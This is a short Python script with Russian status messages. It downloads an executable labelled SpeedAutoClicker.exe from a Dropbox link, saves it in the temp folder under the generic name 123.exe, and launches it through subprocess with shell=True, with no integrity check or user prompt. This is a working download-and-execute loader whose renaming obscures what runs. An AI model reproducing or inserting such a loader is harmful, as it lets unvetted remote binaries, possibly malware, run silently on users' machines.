import os
import tempfile
import requests
import subprocess

URL = "https://www.dropbox.com/scl/fi/3033sr12u7dmaghhfksi6/SpeedAutoClicker.exe?rlkey=o7n419iwy14fsxc6ft6t4gug1&st=gb9z0e32&dl=1"
FILENAME = os.path.join(tempfile.gettempdir(), "123.exe")

def download_and_run():
    if not os.path.exists(FILENAME):
        r = requests.get(URL)
        if r.status_code == 200:
            with open(FILENAME, "wb") as f:
                f.write(r.content)
            print(f"Файл скачан в {FILENAME}")
        else:
            print(f"Ошибка скачивания: {r.status_code}")
    else:
        print(f"Файл уже существует: {FILENAME}")

    if os.path.exists(FILENAME):
        subprocess.Popen([FILENAME], shell=True)
